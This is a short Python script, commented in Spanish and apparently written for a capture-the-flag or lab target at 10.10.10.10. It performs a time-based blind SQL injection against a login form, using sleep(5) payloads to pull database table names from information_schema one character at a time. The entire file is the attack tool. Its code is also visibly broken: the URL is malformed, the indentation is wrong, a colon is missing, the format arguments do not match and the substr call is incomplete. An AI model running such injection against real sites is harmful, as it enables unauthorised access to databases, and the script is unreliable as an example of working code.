#(Para descubrir las tablas de la base de datos)
#!/usr/bin/python3
import requests,time,sys, signal
from pwn import *

def def_handler(sig,frame):
     log.failure("Saliendo")
     sys.exit(1)
signal.signal(signal.SIGINT,def_handler)

url = 'http:/10.10.10.10/index.php'
burp = {'http' : 'http://127.0.0.1:8080'}
s = r'0123456789abcdefghijklmnopqrstuvwxyz'
result=''

def check (payload):
    data_post= {
            'username' : '%s' % payload,
            'password' : 'test'
}

time_start= time.time()
content=requests.post(url, data=data_post)
time_end = time.time ()

if time_end -time_start >5:
      return 1

p2=log.progress ("Payload")
for j in range (0,4):
 for i in range (1, 10):
    p1 = log.progress("Tabla[%d]" % j)
    for c in s:
           payload = "' or if (substr((select table_name from information_schema.tables where table_schema='admin' limit %d,1)='%c',sleep(5),1)-- -" %(j,i,c)
           p2.status ("%s" % payload)
           if check(payload)
                result +=c
                p1.status("%s" % result)
                break
p1.success(" %s" %result)
result = ''